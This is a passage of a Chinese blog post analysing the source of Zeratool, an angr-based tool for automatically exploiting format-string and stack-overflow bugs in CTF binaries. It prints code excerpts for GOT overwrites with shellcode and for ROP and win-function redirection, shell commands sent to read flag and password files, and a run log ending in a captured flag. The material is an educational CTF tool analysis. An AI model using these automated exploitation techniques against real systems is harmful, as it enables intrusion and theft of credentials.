+<span style="color:#f92672">-</span> writes (dict)<span style="color:#960050;background-color:#1e0010">：格式为</span> {addr: value, addr2: value2}<span style="color:#960050;background-color:#1e0010">，</span> <span style="color:#960050;background-color:#1e0010">往</span> addr <span style="color:#960050;background-color:#1e0010">里写入</span> value <span style="color:#960050;background-color:#1e0010">的值（常用：</span><span style="color:#f92672">----</span>{printf_got}<span style="color:#960050;background-color:#1e0010">）</span>
+<span style="color:#f92672">-</span> numbwritten (int)<span style="color:#960050;background-color:#1e0010">：已经由</span> printf <span style="color:#960050;background-color:#1e0010">函数写入的字节数</span>
+</code></pre></div><p>如果不存在目标函数，且没有 NX 保护，则考虑写入 <code>shellcode</code>，修改 got 地址指向 shellcode:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> properties[<span style="color:#e6db74">&#39;protections&#39;</span>][<span style="color:#e6db74">&#39;nx&#39;</span>]:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Binary does not have NX&#34;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Overwriting GOT entry to point to shellcode&#34;</span>)
+        rediscoverAndExploit(binary_name,properties,stack_position) 
+</code></pre></div><p><code>rediscoverAndExploit</code> 重新探索程序状态进行漏洞利用，部分逻辑与 <code>formatDetector</code> 模块相似。</p>
+<p>下面看一下具体实现：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">properties[<span style="color:#e6db74">&#39;shellcode&#39;</span>] <span style="color:#f92672">=</span> getShellcode(properties)
+properties[<span style="color:#e6db74">&#39;stack_position&#39;</span>] <span style="color:#f92672">=</span> stack_position
+inputType <span style="color:#f92672">=</span> properties[<span style="color:#e6db74">&#39;input_type&#39;</span>]
+p <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(binary_name)
+p<span style="color:#f92672">.</span>hook_symbol(<span style="color:#e6db74">&#39;printf&#39;</span>,printFormatSploit)
+</code></pre></div><p>用 <code>getShellcode()</code> 函数根据程序架构获取 <code>shellcode</code>，初始化项目，并使用 <code>printFormatSploit</code> 函数 hook printf，接下来调整寄存器的值。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#66d9ef">if</span> inputType <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;STDIN&#34;</span>:
+        <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">        angr doesn&#39;t use the right base and stack pointers
+</span><span style="color:#e6db74">        when loading the binary, so our addresses are all wrong.
+</span><span style="color:#e6db74">        So we need to grab them manually
+</span><span style="color:#e6db74">        &#39;&#39;&#39;</span>
+        entryAddr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>loader<span style="color:#f92672">.</span>main_object<span style="color:#f92672">.</span>entry <span style="color:#75715e"># 获取入口地址</span>
+        reg_values <span style="color:#f92672">=</span> getRegValues(binary_name,entryAddr) <span style="color:#75715e"># 将入口地址作为 r2 的运行断点</span>
+        state <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>factory<span style="color:#f92672">.</span>full_init_state(args<span style="color:#f92672">=</span>argv)
+        register_names <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>arch<span style="color:#f92672">.</span>register_names<span style="color:#f92672">.</span>values() <span style="color:#75715e"># 获取寄存器的名称</span>
+        <span style="color:#66d9ef">for</span> register <span style="color:#f92672">in</span> register_names:
+            <span style="color:#66d9ef">if</span> register <span style="color:#f92672">in</span> reg_values: 
+                state<span style="color:#f92672">.</span>registers<span style="color:#f92672">.</span>store(register,reg_values[register]) <span style="color:#75715e"># 重新设置寄存器的值</span>
+</code></pre></div><p><code>getRegValues</code> 使用 r2 获取运行时寄存器的值，通过 angr 的 state.registers.store 重新设置寄存器的值。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getRegValues</span>(filename,endAddr):
+    r2 <span style="color:#f92672">=</span> r2pipe<span style="color:#f92672">.</span>open(filename)
+    r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;doo&#39;</span>) <span style="color:#75715e"># Reopen in debugger mode with args </span>
+    r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;dcu {}&#39;</span><span style="color:#f92672">.</span>format(endAddr)) <span style="color:#75715e"># Continue until address</span>
+    regs <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;drj&#39;</span>)) <span style="color:#75715e">#  Show &#39;gpr&#39; registers</span>
+    r2<span style="color:#f92672">.</span>quit()
+    <span style="color:#66d9ef">return</span> regs
+</code></pre></div><p>接下来探索程序状态，与漏洞检测部分类似，我们重点看一下 <code>printFormatSploit</code> 的实现。它与 <code>formatDetector</code>  中的 <code>printFormat</code> 函数类似，区别在于获得可控缓冲区后的处理逻辑。</p>
+<p><code>printFormat</code>  获取缓冲区后便尝试构造 <code>payload</code> ，设定漏洞利用约束，尝试将 <code>shellcode</code> 存放在缓冲区中。</p>
+<p>实际构造的字符串格式为 <code>(Format GOT Write) + (Shellcode)</code>，因为需要计算  <code>(Format GOT Write)</code> 的长度，此处需要模拟构造一次 <code>payload</code> 获得长度，以此计算 <code>shellcode</code> 的地址。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># 获得可控的缓冲区，前面的逻辑与 printFormat 相同</span>
+ <span style="color:#66d9ef">if</span> greatest_count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+     shellcode <span style="color:#f92672">=</span> properties[<span style="color:#e6db74">&#39;shellcode&#39;</span>]
+     stack_pos <span style="color:#f92672">=</span> properties[<span style="color:#e6db74">&#39;stack_position&#39;</span>]
+     <span style="color:#66d9ef">for</span> got_name,got_addr <span style="color:#f92672">in</span> properties[<span style="color:#e6db74">&#39;protections&#39;</span>][<span style="color:#e6db74">&#39;got&#39;</span>]<span style="color:#f92672">.</span>items():
+         backup_state <span style="color:#f92672">=</span> state_copy<span style="color:#f92672">.</span>copy()
+         <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Overwiting {} at {}&#34;</span><span style="color:#f92672">.</span>format(got_name,hex(got_addr)))
+         solv <span style="color:#f92672">=</span> state_copy<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>eval
+		<span style="color:#75715e"># 模拟写入获得估计长度</span>
+         buffer_address <span style="color:#f92672">=</span> var_loc <span style="color:#f92672">+</span> position <span style="color:#75715e"># 获得可控 buffer的起始的地址</span>
+         writes <span style="color:#f92672">=</span> {got_addr:buffer_address} 
+         format_write <span style="color:#f92672">=</span> fmtstr_payload(stack_pos, writes, numbwritten<span style="color:#f92672">=</span>position, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;short&#39;</span>) <span style="color:#75715e"># 构造 payload, 将 got 地址改为 buffer 地址</span>
+         write_len <span style="color:#f92672">=</span> len(format_write)
+         <span style="color:#75715e">#Real write</span>
+         buffer_address <span style="color:#f92672">=</span> var_loc <span style="color:#f92672">+</span> position <span style="color:#f92672">+</span> write_len <span style="color:#75715e"># 获得用于写入shellcode的buffer地址</span>
+         writes <span style="color:#f92672">=</span> {got_addr:buffer_address}
+         format_write <span style="color:#f92672">=</span> fmtstr_payload(stack_pos, writes, numbwritten<span style="color:#f92672">=</span>position, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;short&#39;</span>)
+         <span style="color:#75715e">#Final payload</span>
+         format_payload <span style="color:#f92672">=</span> format_write <span style="color:#f92672">+</span> shellcode <span style="color:#75715e"># 最终输入的字符串</span>
+         var_value_length <span style="color:#f92672">=</span> len(format_payload)                   			 self<span style="color:#f92672">.</span>constrainBytes(state_copy,var_value,var_loc,position,var_value_length,strVal<span style="color:#f92672">=</span>format_payload)  <span style="color:#75715e"># 设定约束</span>
+         vuln_string <span style="color:#f92672">=</span> solv(var_value, cast_to<span style="color:#f92672">=</span>str)
+         binary_name <span style="color:#f92672">=</span> state_copy<span style="color:#f92672">.</span>project<span style="color:#f92672">.</span>filename
+         results <span style="color:#f92672">=</span> {}
+         results[<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">=</span> False
+         <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[~] Testing payload&#39;</span>)
+         <span style="color:#75715e">#约束求解获得 stdin 值，发送 payload 并处理返回信息</span>
+         results <span style="color:#f92672">=</span> sendExploit(binary_name,properties,state_copy<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+         <span style="color:#66d9ef">if</span> results[<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">==</span> True:
+             exploit_results[<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">=</span> results[<span style="color:#e6db74">&#39;flag_found&#39;</span>]
+             exploit_results[<span style="color:#e6db74">&#39;input&#39;</span>] <span style="color:#f92672">=</span> format_input
+</code></pre></div><p><code>sendExploit</code> 函数用于发送 <code>payload</code>, 并处理返回信息，如果返回信息包含 “{” 和 “}”，则说明找到 flag。如果没有，返回的可能是 shell，发送 cat命令获取 flag。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">proc<span style="color:#f92672">.</span>sendline()
+proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;ls;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat *flag*;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># 发送 shell 命令获得 flag</span>
+proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat *pass*;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+command_results <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>) 
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;{&#39;</span> <span style="color:#f92672">in</span> command_results <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;}&#39;</span> <span style="color:#f92672">in</span> command_results: <span style="color:#75715e"># 查看是否有 flag</span>
+    send_results[<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">=</span> True
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Flag found:&#34;</span>)
+    <span style="color:#66d9ef">print</span>(command_results<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x20\x20</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))
+</code></pre></div><p>以上就是格式化字符串漏洞利用的大致内容，有些特殊情况的处理没有提及，可以通过阅读源码了解。</p>
+<p>接下来我们查看缓冲区溢出漏洞利用的内容。</p>
+<h4 id="缓冲区溢出漏洞">缓冲区溢出漏洞</h4>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/d4dda1a017/lib/overflowExploiter.py">overflowExploiter.py</a> ，主函数为 <code>exploitOverflow</code></p>
+<p>**利用思路：**修改 pc 值指向 <code>winfunction / ropchain / shellcode</code>地址，劫持程序控制流。</p>
+<p>首先初始化项目，探索程序状态，设置模拟管理器 <code>explore</code> 时的 <code>step_func</code> 为 <code>pickFilter</code>函数，此处逻辑与检测缓冲区溢出漏洞逻辑相似，只是 <code>step_func</code> 不同。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	simgr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>factory<span style="color:#f92672">.</span>simgr(state, immutable<span style="color:#f92672">=</span>False, save_unconstrained<span style="color:#f92672">=</span>True)
+    step_func <span style="color:#f92672">=</span> pickFilter(simgr,properties) <span style="color:#75715e"># 设置 step_func </span>
+    <span style="color:#f92672">....</span>
+    run_environ <span style="color:#f92672">=</span> {}
+    run_environ[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">=</span> None
+    end_state <span style="color:#f92672">=</span> None
+    <span style="color:#66d9ef">try</span>:
+        <span style="color:#a6e22e">@timeout_decorator.timeout</span>(<span style="color:#ae81ff">1200</span>)
+        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploreBinary</span>(simgr):
+            simgr<span style="color:#f92672">.</span>explore(find<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> s: <span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>globals,step_func<span style="color:#f92672">=</span>step_func) <span style="color:#75715e"># 探索</span>
+
+        exploreBinary(simgr)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;found&#39;</span> <span style="color:#f92672">in</span> simgr<span style="color:#f92672">.</span>stashes <span style="color:#f92672">and</span> len(simgr<span style="color:#f92672">.</span>found): <span style="color:#75715e"># 找到</span>
+            end_state <span style="color:#f92672">=</span> simgr<span style="color:#f92672">.</span>found[<span style="color:#ae81ff">0</span>]
+            end_state_eb <span style="color:#f92672">=</span> simgr<span style="color:#f92672">.</span>found[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;state_eb&#39;</span>]
+            run_environ[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">=</span> end_state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;type&#39;</span>]
+</code></pre></div><p>我们来看一下 <code>pickFilter</code> 的实现，该函数用于判断程序信息，以采用不同的漏洞技术, 对应实现了 <code>point_to_win_filter /  point_to_shellcode_filter / point_to_ropchain_filter</code> 三个子函数，这三个子函数均对模拟管理器中的未约束状态进行分析，根据情况构造不同的约束</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	<span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>]: <span style="color:#75715e"># 存在目标函数则修改 got 指向目标函数</span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Using point to win function technique&#34;</span>)
+        <span style="color:#66d9ef">return</span> point_to_win_filter
+    <span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> properties[<span style="color:#e6db74">&#39;protections&#39;</span>][<span style="color:#e6db74">&#39;nx&#39;</span>]: <span style="color:#75715e"># 如果没有 NX，则采用 shellcode </span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Binary does not have NX&#34;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Placing shellcode and pointing&#34;</span>)
+        <span style="color:#66d9ef">return</span> point_to_shellcode_filter
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Building rop and pointing&#34;</span>) 
+        <span style="color:#66d9ef">return</span> point_to_ropchain_filter  <span style="color:#75715e"># 使用 ropchain</span>
+    <span style="color:#66d9ef">return</span> None
+</code></pre></div><p>在 <code>point_to_win_filter</code> 中，构造如下约束:</p>
+<ol>
+<li>pc 的值为目标函数的地址</li>
+<li>stdin 值为可打印字符</li>
+</ol>
+<p>最后进行约束求解，得到输入字符串</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">stdin_str <span style="color:#f92672">=</span> repr(str(state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)))
+</code></pre></div><p>在 <code>point_to_shellcode_filter</code>，约束条件如下：</p>
+<ol>
+<li>获取可控的 buffer, 可存放 shellcode</li>
+<li>限定 pc 值指向 buffer 地址</li>
+<li>输入值为可打印字符</li>
+</ol>
+<p>获取符号化的内存，根据长度进行排序</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">addresses <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> find_symbolic_buffer(state_copy,len(shellcode))]
+<span style="color:#66d9ef">if</span> len(addresses):
+	list<span style="color:#f92672">.</span>sort(addresses)
+</code></pre></div><p>如果无法满足，找到 <code>bad bytes</code>, 添加到 <code>avoidList</code>，重新生成<code>shellcode</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">my_buf <span style="color:#f92672">=</span> state_copy<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(address,len(shellcode)) <span style="color:#75715e">#获取 buffer 的内容</span>
+state_copy<span style="color:#f92672">.</span>satisfiable(extra_constraints<span style="color:#f92672">=</span>([my_buf <span style="color:#f92672">==</span> shellcode])) <span style="color:#75715e">#判断是否可以满足</span>
+</code></pre></div><p>如果无法找到合适的 <code>shellcode</code>, 会抛出异常。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">except</span> PwnlibException <span style="color:#66d9ef">as</span> e:
+     <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Unable to encode shellcode to avoid {}&#34;</span><span style="color:#f92672">.</span>format(avoidList))
+<span style="color:#66d9ef">break</span>
+</code></pre></div><p>否则，我们会获得可以满足条件的 <code>shellcode</code>, 最后设定约束对输入值进行求解。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">constraints <span style="color:#f92672">=</span> constrainToAddress(state_copy,eip,address)
+</code></pre></div><p>代码中还考虑了大端序和小端序的问题，这里就略去了。</p>
+<p>最后通过 <code>repr(str(state.posix.dumps(0)))</code> 对输入字符串进行约束求解。</p>
+<p><code>point_to_ropchain_filter</code> 函数与 <code>point_to_shellcode_filter</code>十分相似，只是 shellcode 改为 ropchain</p>
+<p><code>getRopchain</code> 函数实现了构造 <code>ropchain</code>，该函数利用了 <code>ropper</code> 的 <code>RopperService</code> 来构造 rop 链。</p>
+<p>以上就是缓冲区溢出漏洞利用的主要内容。</p>
+<h2 id="运行结果">运行结果</h2>
+<p>以下 <code>zeratool</code> 运行示例效果，感兴趣的可以使用其他程序试试，查看效果。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">root<span style="color:#a6e22e">@3566e45f97d4</span>:<span style="color:#f92672">/</span>ctf<span style="color:#f92672">/</span>Zeratool<span style="color:#75715e"># python zeratool.py challenges/ret -u ctf.hackucf.org -p 9003</span>
+[<span style="color:#f92672">+</span>] Checking pwn type<span style="color:#f92672">...</span>
+[<span style="color:#f92672">+</span>] Checking <span style="color:#66d9ef">for</span> overflow pwn type<span style="color:#f92672">...</span>
+[<span style="color:#f92672">+</span>] Vulnerable path found <span style="color:#e6db74">&#39;0000000000000000000000000000000000000000000000000000000000000000</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">000...&#39;</span>
+[<span style="color:#f92672">+</span>] Triggerable <span style="color:#66d9ef">with</span> STDIN : <span style="color:#e6db74">&#39;0000000000000000000000000000000000000000000000000000000000000000</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">00...&#39;</span>
+[<span style="color:#f92672">+</span>] Getting binary protections
+[<span style="color:#f92672">+</span>] Found win function sym<span style="color:#f92672">.</span>win
+[<span style="color:#f92672">+</span>] Exploiting overflow
+Process <span style="color:#66d9ef">with</span> PID <span style="color:#ae81ff">825</span> started<span style="color:#f92672">...</span>
+File dbg:<span style="color:#f92672">///</span>ctf<span style="color:#f92672">/</span>Zeratool<span style="color:#f92672">/</span>challenges<span style="color:#f92672">/</span>ret  reopened <span style="color:#f92672">in</span> read<span style="color:#f92672">-</span>write mode
+<span style="color:#f92672">=</span> attach <span style="color:#ae81ff">825</span> <span style="color:#ae81ff">825</span>
+Continue until <span style="color:#ae81ff">0x0804868b</span> using <span style="color:#ae81ff">1</span> bpsize
+hit breakpoint at: <span style="color:#ae81ff">804868</span>b
+[<span style="color:#f92672">+</span>] Using point to win function technique
+[<span style="color:#f92672">+</span>] Vulnerable path found <span style="color:#e6db74">&#39;0000000000000000000000000000000000000000000000000000000000000000</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">000000000000</span><span style="color:#ae81ff">\x08\x04\x86\x1b</span><span style="color:#e6db74">0000000000000000&#39;</span>
+[<span style="color:#f92672">+</span>] Triggerable <span style="color:#66d9ef">with</span> STDIN : <span style="color:#e6db74">&#39;0000000000000000000000000000000000000000000000000000000000000000</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">000000000000</span><span style="color:#ae81ff">\x08\x04\x86\x1b</span><span style="color:#e6db74">0000000000000000</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">...&#39;</span>
+<span style="color:#e6db74">&#39;0000000000000000000000000000000000000000000000000000000000000000</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">000000000000</span><span style="color:#ae81ff">\x08\x04\x86\x1b</span><span style="color:#e6db74">0000000000000000</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">....&#39;</span>
+
+[<span style="color:#f92672">~</span>] Failed exploit launch<span style="color:#f92672">.</span> Switching Endianess
+<span style="color:#e6db74">&#39;0000000000000000000000000000000000000000000000000000000000000000</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">000000000000</span><span style="color:#ae81ff">\x1b\x86\x04\x08</span><span style="color:#e6db74">0000000000000000\x0.....&#39;</span>
+you Win<span style="color:#960050;background-color:#1e0010">!</span>
+
+challenges  flag<span style="color:#f92672">.</span>txt	lib	 radare2    samples<span style="color:#f92672">.</span>sh
+core	    install<span style="color:#f92672">.</span>sh	LICENSE  README<span style="color:#f92672">.</span>md  zeratool<span style="color:#f92672">.</span>py
+flag{y0u_g0t_1t}
+</code></pre></div><h2 id="总结">总结</h2>
+<p><code>zeratool</code> 基于 angr，其漏洞利用自动化思路基本就是探索状态，分析利用状态，设定约束，求解约束。Zeratool 仅实现了格式化字符串和栈溢出漏洞的自动化利用，使用的利用技术也较为简单，而且没有考虑一些保护机制，实现也有一些有一些冗余，许多地方逻辑相似但是没有很好地模块化。</p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li><a href="https://github.com/ChrisTheCoolHut/Zeratool">https://github.com/ChrisTheCoolHut/Zeratool</a></li>
+<li><a href="https://angr.io/api-doc/">https://angr.io/api-doc/</a></li>
+<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.1_format_string.html">https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.1_format_string.html</a></li>
+</ol>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
